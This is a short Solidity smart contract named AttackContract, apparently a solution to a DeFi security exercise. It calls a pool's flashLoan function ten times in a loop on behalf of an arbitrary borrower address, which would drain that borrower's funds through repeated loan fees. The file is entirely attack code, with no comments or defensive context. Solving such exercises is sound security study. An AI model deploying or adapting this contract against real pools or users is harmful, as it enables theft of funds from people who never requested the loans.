pragma solidity ^0.6.0;

interface Pool{
  function flashLoan(address payable borrower, uint256 borrowAmount) external;
}

contract AttackContract{
  Pool pool;
  
  constructor(Pool _pool)public{
    pool = _pool;
  }

  function reborrow(address payable _borrower, uint _amount) public{
    for (uint8 i; i < 10; i++){
      pool.flashLoan(_borrower, _amount);
    }
  }
}